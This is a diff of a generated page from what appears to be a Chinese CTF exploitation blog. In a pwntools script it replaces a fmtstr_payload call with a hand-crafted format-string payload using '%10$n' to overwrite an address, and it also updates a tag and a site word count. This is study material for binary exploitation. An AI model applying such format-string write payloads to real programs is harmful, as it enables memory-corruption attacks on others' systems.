@@ -595,7 +595,8 @@ sh.sendline(&#39;123&#39;)
 
 sh.recv()
 #formal bug
-payload3 = fmtstr_payload(8,{addr1:0}) //因为那两个元素连续所以可以直接这样清零
+payload3 = &quot;AAA%082d&quot; + &quot;%10$nAAA&quot; + p64(addr1)  #构造格式化字符串payload时要注意参数位置，以及对应程序操作位数
+
 
 #gdb.attach(sh)
 sh.sendline(payload3)
@@ -946,8 +947,8 @@ sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" cla
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/wiki/" target="_blank">
-                        <span class="chip bg-color">wiki</span>
+                    <a href="/tags/wiki-pwn/" target="_blank">
+                        <span class="chip bg-color">wiki--pwn</span>
                     </a>
                     
                 </div>
@@ -1058,7 +1059,7 @@ sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" cla
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">15.7k</span>
+                <span class="white-color">15.9k</span>
             
 
             
